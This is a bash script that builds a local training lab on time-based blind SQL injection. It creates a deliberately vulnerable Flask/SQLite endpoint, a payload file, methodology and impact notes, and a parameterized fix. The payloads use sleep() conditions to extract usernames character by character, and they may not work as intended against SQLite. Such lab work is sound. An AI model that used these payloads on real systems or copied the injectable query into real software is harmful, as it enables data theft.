#!/usr/bin/env bash

set -e

BASE="/home/karime/portswigger_labs/sqli/04-time-based/01-time-delay-injection"

echo "[+] Building Time-Based SQLi lab..."
echo "    $BASE"

mkdir -p "$BASE"/{vuln,exploit,notes,fix,payloads,automation,db,reports}

# ============================================================
# README
# ============================================================

cat > "$BASE/README.md" << 'EOF'
# 07 — Time-Based SQL Injection

## Concept
No output, no errors, no boolean difference.

Only observable signal:
→ response delay

## Technique
If condition is TRUE → database sleeps
If FALSE → normal response

EOF

# ============================================================
# VULNERABLE APP
# ============================================================

cat > "$BASE/vuln/vuln.py" << 'EOF'
from flask import Flask, request
import sqlite3
import time

app = Flask(__name__)

@app.route("/profile")
def profile():

    username = request.args.get("username", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # Vulnerable time-based injection point
    query = f"""
        SELECT id FROM users
        WHERE username = '{username}'
    """

    print("[SQL]", query)

    start = time.time()

    try:
        cur.execute(query).fetchone()
    except:
        pass

    # Artificial delay simulation (vulnerable pattern in real apps)
    time.sleep(0.2)

    return {
        "status": "ok",
        "time": time.time() - start
    }

if __name__ == "__main__":
    app.run(debug=True)
EOF

# ============================================================
# PAYLOADS
# ============================================================

cat > "$BASE/exploit/payloads.txt" << 'EOF'
# BASIC CONFIRMATION

' AND sleep(3)--

' AND (SELECT sleep(3))--

# BOOLEAN + TIME

' AND (SELECT CASE WHEN (1=1) THEN sleep(3) ELSE sleep(0) END)--

' AND (SELECT CASE WHEN (1=2) THEN sleep(3) ELSE sleep(0) END)--

# CHARACTER EXTRACTION (SLOW BUT REAL)

' AND (SELECT CASE WHEN (SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a')
THEN sleep(3) ELSE sleep(0) END)--

# LENGTH CHECK

' AND (SELECT CASE WHEN (LENGTH((SELECT username FROM users LIMIT 1))=5)
THEN sleep(3) ELSE sleep(0) END)--
EOF

# ============================================================
# METHODOLOGY
# ============================================================

cat > "$BASE/notes/methodology.txt" << 'EOF'
TIME-BASED SQLi FLOW

STEP 1 — baseline response time
(no injection)

STEP 2 — inject delay payload
sleep(3)

STEP 3 — confirm timing difference

STEP 4 — convert boolean logic into delay logic

STEP 5 — extract data character-by-character

KEY IDEA:
Time = oracle channel
EOF

# ============================================================
# REAL WORLD NOTES
# ============================================================

cat > "$BASE/notes/real_world.txt" << 'EOF'
REAL WORLD SCENARIOS

- WAF blocking output-based SQLi
- APIs returning generic JSON
- headless microservices
- internal job schedulers

WHY IT WORKS:
Even if output is blocked,
database still executes logic.
EOF

# ============================================================
# IMPACT
# ============================================================

cat > "$BASE/notes/impact.txt" << 'EOF'
IMPACT

- full blind data extraction
- authentication bypass
- slow data exfiltration
- stealth attacks (low detection)

SEVERITY: CRITICAL (silent exploitation)
EOF

# ============================================================
# FIX
# ============================================================

cat > "$BASE/fix/fix.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/profile")
def profile():

    username = request.args.get("username", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = "SELECT id FROM users WHERE username = ?"

    cur.execute(query, (username,)).fetchone()

    return {"status": "ok"}
EOF

# ============================================================
# DB CONTEXT
# ============================================================

cat > "$BASE/db/schema.txt" << 'EOF'
TABLE users:
- id
- username
- password
EOF

echo "[+] Time-Based SQLi lab created successfully"
